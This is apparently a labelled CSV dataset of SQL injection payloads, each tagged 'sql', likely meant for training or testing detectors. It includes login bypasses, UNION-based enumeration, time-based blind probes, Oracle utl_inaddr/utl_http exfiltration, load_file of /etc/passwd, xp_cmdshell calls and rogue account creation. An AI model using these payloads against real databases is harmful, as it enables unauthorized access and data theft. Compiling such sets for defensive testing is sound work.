Payloads,Types
"1234 "" AND 1  =  0 UNION ALL SELECT ""admin"", ""81dc9bdb52d04dc20036dbd8313ed055",sql
" select * from users where id  =  1 or ""%["" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#"";  =  1 union select 1,version  (    )   -- 1",sql
admin' or '1'  =  '1'#,sql
select * from users where id  =  1 +$ 1 or 1  =  1 -- 1,sql
s,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sql
 select * from information_schema.tables--,sql
" select * from users where id  =  1 or ""$&"" or 1  =  1 -- 1",sql
1   )    )    or pg_sleep  (  __TIME__  )  --,sql
" select * from users where id  =  '1' union select !<@,version  (    )   -- 1'",sql
declare @q nvarchar   (  200  )   select @q   =   0x770061 ...,sql
 or 1  =  1 or ''  =  ',sql
select * from users where id  =  1 %!<1 or 1  =  1 -- 1,sql
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,sql
" select * from users where id  =  1 or ""]1"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or $+<1 union select 1,@@VERSION -- 1",sql
or 'unusual'   =   'unusual',sql
 or 1 in   (  select @@version  )  --,sql
truncate,sql
as,sql
 or 3  =  3 --,sql
" select * from users where id  =  1 ||1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
" select * from users where id  =  1 <@$$ union select 1,version  (    )   -- 1",sql
"admin""  )   or   (  ""1""  =  ""1",sql
" select * from users where id  =  1 or 1#""@ union select 'a',version  (    )   -- 1",sql
"1  )   or benchmark  (  10000000,MD5  (  1   )    )   #",sql
" select * from users where id  =  1 union select .1_,version  (    )   -- 1",sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.DATABASE_NAME FROM DUAL   )    )    AND 'i'  =  'i,sql
" or 0  =  0 #""",sql
select * from users where id  =  1 %$ 1 or 1  =  1 -- 1,sql
select * from users where id  =  1 %!<@ or 1  =  1 -- 1,sql
"; if not  (  substring   (    (   select @@version  )  ,25,1  )   <> 0  )   waitfor delay '0:0:2' --",sql
1  )   or sleep  (  __TIME__  )  #,sql
" select * from users where id  =  1 or ""1_"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 <1## union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 + $+*\ union select null,@@VERSION -- 1",sql
select * from users where id  =  1. <@ or 1  =  1 -- 1,sql
 or true--,sql
; execute immediate 'sel' || 'ect us' || 'er',sql
hi' or 'x'  =  'x';,sql
select * from users where id  =  1 <@ or 1  =  1 -- 1,sql
" select * from users where id  =  1 or "".,"" or 1  =  1 -- 1",sql
admin' #,sql
" select * from users where id  =  1 <@$_ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or "",  (  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or "",{"" or 1  =  1 -- 1",sql
" union select 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",sql
"""  )  ;waitfor delay '0:0:__TIME__'--",sql
 or 'unusual'   =   'unusual',sql
"insert into mysql.user   (  user, host, password  )   values   (  'name', 'localhost', password  (  'pass123'   )    )   ",sql
"admin"" or ""1""  =  ""1""/*",sql
" select * from users where id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or \<1 union select 1,@@VERSION -- 1",sql
like,sql
or username like char  (  37  )  ;,sql
 )    )    or pg_sleep  (  __TIME__  )  --,sql
select * from users where id  =  1 or $+<\ or 1  =  1 -- 1,sql
or 3  =  3,sql
" select * from users where id  =  1 or ""  (  ."" or 1  =  1 -- 1",sql
select * from users where id  =  1 or   (  $+  )    =  1 or 1  =  1 -- 1,sql
exec sp,sql
" select * from users where id  =  1 or \+<$ union select 1,@@VERSION -- 1",sql
select * from users where id  =  1 or \<$ or 1  =  1 -- 1,sql
" select * from users where id  =  1.&&1 union select 1,version  (    )   -- 1",sql
admin' or 1  =  1/*,sql
a' waitfor delay '0:0:10'--,sql
" select * from users where id  =  1 +  (  \  )   union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 union select .1$_,version  (    )   -- 1",sql
and 1 in   (  select var from temp  )  --,sql
hi'  )   or   (  'a'  =  'a,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sql
"admin"" or 1  =  1",sql
"""  )   or true--",sql
" select * from users where id  =  '1' or $ .  =  1 union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 or ""  (  {"" or 1  =  1 -- 1",sql
1  )   or pg_sleep  (  __TIME__  )  --,sql
" select * from users where id  =  1 or ""{."" or 1  =  1 -- 1",sql
"""  )   or sleep  (  __TIME__  )    =  """,sql
select * from users where id  =  1.<@. or 1  =  1 -- 1,sql
"admin""  )   or   (  ""1""  =  ""1""--",sql
" select * from users where id  =  1<@.. union select 1,version  (    )   -- 1",sql
; exec xp_regread,sql
" select * from users where id  =  '1' + @ 1 union select 1,version  (    )   -- 1'",sql
select * from users where id  =  1 + \+%1 or 1  =  1 -- 1,sql
" select * from users where id  =  1 or "";1"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""%&"" or 1  =  1 -- 1",sql
1 and 1  =  1,sql
or 0  =  0 #,sql
union select * from users where login   =   char ...,sql
" select * from users where id  =  1 union select 1||@,version  (    )   -- 1",sql
admin'  )   or '1'  =  '1'--,sql
1;SELECT *,sql
" select * from users where id  =  1 or ""{;"" or 1  =  1 -- 1",sql
x' and 1  =    (  select count  (  *  )   from tabname  )  ; --,sql
" select * from users where id  =  '1' or """"<@ union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or ""?,"" or 1  =  1 -- 1",sql
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",sql
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",sql
procedure,sql
or ''  =  ',sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT SYS.LOGIN_USER FROM DUAL   )    )    AND 'i'  =  'i,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sql
\'; desc users; --,sql
" select * from users where id  =  1 or   (  \.  )    =  1 union select 1,@@VERSION -- 1",sql
select * from users where id  =  '1' or $ 1  =  1 or 1  =  1 -- 1',sql
""" or """"^""",sql
"""-""",sql
" select * from users where id  =  1 or \<   =  1 union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 union select 1<@$,version  (    )   -- 1",sql
" select * from users where id  =  1 *\ union select null,@@VERSION -- 1",sql
" select * from users where id  =  '1' or !<@ union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or "".%"" or 1  =  1 -- 1",sql
admin'/*,sql
" select * from users where id  =  1 or ""  (  #"" or 1  =  1 -- 1",sql
||UTL_HTTP.REQUEST,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  1   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",sql
"""   )    )    or benchmark  (  10000000,MD5  (  1   )    )   #",sql
" select * from users where id  =  1 <@.$ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or $ .  =  1 union select 1,@@VERSION -- 1",sql
select * from users where id  =  '1' <@.$ or 1  =  1 -- 1',sql
1 uni/**/on select all from where,sql
" select * from users where id  =  1 +$ . union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or 1#""? union select null,version  (    )   -- 1",sql
admin'  )   or '1'  =  '1'#,sql
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',sql
or '7659'  =  '7659,sql
" select * from users where id  =  1 or ""{@"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 union select +!<1,version  (    )   -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",sql
" select * from users where id  =  1 or ""  (  @"" or 1  =  1 -- 1",sql
or true--,sql
" select * from users where id  =  1 union select !<1,version  (    )   -- 1",sql
" select * from users where id  =  '1' union select \#,@@VERSION -- 1'",sql
" select * from users where id  =  1 or 1#""{ union select 1,version  (    )   -- 1",sql
""" or true--",sql
select * from users where id  =  1. or 1  =  1 -- 1,sql
" select * from users where id  =  1 or @#"",  =  1 union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or "";@"" or 1  =  1 -- 1",sql
â or 3  =  3 --,sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT global_name FROM global_name   )    )    AND 'i'  =  'i,sql
" select * from users where id  =  1 +1 union select null,banner from v$version where rownum  =  1 -- 1",sql
" select * from users where id  =  1 or "",,""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 + $+%1 union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or 1#""? union select version  (    )  ,version  (    )   -- 1",sql
" select * from users where id  =  1 or ""  )  1"" or 1  =  1 -- 1",sql
 or uid like '%,sql
select * from users where id  =  '1' <@&1 or 1  =  1 -- 1',sql
" select * from users where id  =  '1' union select !<1,version  (    )   -- 1'",sql
23 or 1  =  1; --,sql
" select * from users where id  =  1 or \<\. union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""{  (  ""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""%_"" or 1  =  1 -- 1",sql
select * from users where id  =  1 +   (  \.  )   or 1  =  1 -- 1,sql
" select * from users where id  =  '1' union select \,@@VERSION -- 1'",sql
0 or 1  =  1,sql
select * from users where id  =  1 &@ or 1  =  1 -- 1,sql
"admin""  )   or ""1""  =  ""1",sql
select * from users where id  =  1 or \<   =  1 or 1  =  1 -- 1,sql
" select * from users where id  =  1 or ""??"" or 1  =  1 -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sql
&apos; OR,sql
sqlvuln;,sql
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,sql
select * from users where id  =  '1' + $+%\ or 1  =  1 -- 1',sql
""" or """"*""",sql
"hi or 1  =  1 --""",sql
" select * from users where id  =  1. union select null,banner from v$version where rownum  =  1 -- 1",sql
; exec master..xp_cmdshell 'ping 172.10.1.255'--,sql
" select * from users where id  =  '1' or 1^  =  1 union select 1,banner from v$version where rownum  =  1 -- 1'",sql
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",sql
select * from information_schema.tables--,sql
select * from users where id  =  1 or \<\. or 1  =  1 -- 1,sql
   (  select top 1,sql
Ã½ or 1  =  1 --,sql
a' --,sql
 or 1  =  1 /*,sql
" select * from users where id  =  1 or 1#"", union select null,version  (    )   -- 1",sql
" select * from users where id  =  '1' union select $ .,@@VERSION -- 1'",sql
--,sql
"exec sp_addlogin 'name' , 'password'",sql
" select * from users where id  =  1   union select null,banner from v$version where rownum  =  1 -- 1",sql
0x77616974666F722064656C61792027303A303A31302700 exec  (  @s  ) ,sql
" select * from users where id  =  1 or "".  )  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or @<@  =  1 union select 1,version  (    )   -- 1",sql
group by userid having 1  =  1--,sql
" select * from users where id  =  1 + \+%1 union select null,@@VERSION -- 1",sql
select * from users where id  =  1 *1 or 1  =  1 -- 1,sql
" select * from users where id  =  1 or @#"";  =  1 or 1  =  1 -- 1",sql
‘ or 1  =  1 --,sql
" select * from users where id  =  1 *\. union select null,@@VERSION -- 1",sql
select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1,sql
or 'a'  =  'a,sql
declare @s varchar  (  22  )   select @s   = ,sql
" select * from users where id  =  1 union select 1<@,version  (    )   -- 1",sql
" select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",sql
@variable,sql
; exec master..xp_cmdshell,sql
select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1,sql
" select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",sql
" select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",sql
" select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",sql
" select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",sql
 and 1 in   (  select var from temp  )  --,sql
" select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",sql
" select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",sql
or x  =  x,sql
or a  =  a,sql
or '1'  =  '1,sql
" select * from users where id  =  11<1# union select 1,version  (    )   -- 1",sql
   )    )    or    (    (   'x'   )    )     =     (    (   'x,sql
" select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",sql
; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --,sql
select * from users where id  =  1 <@<@ or 1  =  1 -- 1,sql
" select * from users where id  =  1 union select @<@$,version  (    )   -- 1",sql
" select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",sql
" select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",sql
a' or 1  =  1--,sql
 )   or   (  a  =  a,sql
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",sql
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",sql
" select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",sql
-- &password  = ,sql
select * from users where id  =  1 <@. or 1  =  1 -- 1,sql
" select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",sql
" select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",sql
 or '1'  =  '1,sql
admin' or 1  =  1,sql
" select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",sql
" select * from users where id  =  1 union select @||1,version  (    )   -- 1",sql
" select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",sql
" union select * from users where login   =   char  (  114,111,111,116  )  ;",sql
" select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",sql
 or 1  =  1--,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",sql
pg_sleep  (  __TIME__  )  --,sql
‘ or 3  =  3 --,sql
" select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",sql
 )   union select * from information_schema.tables;,sql
" select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",sql
"  )   or benchmark  (  10000000,MD5  (  1   )    )   #",sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",sql
""" or """" """,sql
delete,sql
;waitfor delay '0:0:__TIME__'--,sql
 or 1  =  1 --,sql
1' and non_existant_table   =   '1,sql
" select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",sql
" select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",sql
declare @s varchar  (  200  )   select @s   =   0x77616974 ...,sql
x' AND userid IS NULL; --,sql
" select * from users where id  =  1 or "";["" or 1  =  1 -- 1",sql
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 union select @<@,version  (    )   -- 1",sql
" select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",sql
 AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i,sql
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",sql
select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1,sql
" select * from users where id  =  1 or "".["" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",sql
UNION ALL SELECT,sql
" select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",sql
select * from users where id  =  1 or \<1 or 1  =  1 -- 1,sql
" select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
x' or full_name like '%bob%,sql
x' and members.email is NULL; --,sql
 or 2 > 1,sql
select * from users where id  =  1.*1 or 1  =  1 -- 1,sql
"""  )   or pg_sleep  (  __TIME__  )  --",sql
 ',sql
" select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",sql
select * from users where id  =  1 or \.<$ or 1  =  1 -- 1,sql
 )   or sleep  (  __TIME__  )    =  ',sql
sleep 50',sql
" select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",sql
select * from users where id  =  1 + $+%\ or 1  =  1 -- 1,sql
" select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",sql
or sleep  (  __TIME__  )    =  ',sql
" select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",sql
" select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",sql
" select * from users where id  =  1 union select  @ $,version  (    )   -- 1",sql
" select * from users where id  =  1 union select +!<@,version  (    )   -- 1",sql
" select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",sql
or 2 > 1,sql
; exec   (  'sel' + 'ect us' + 'er'  ) ,sql
anything' OR 'x'  =  'x,sql
" select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",sql
" select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",sql
" select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",sql
&',sql
a' or 3  =  3--,sql
" select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",sql
" select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",sql
"admin""or 1  =  1 or """"  =  """,sql
uni/**/on sel/**/ect,sql
""" or """"&""",sql
 )    )   ;waitfor delay '0:0:__TIME__'--,sql
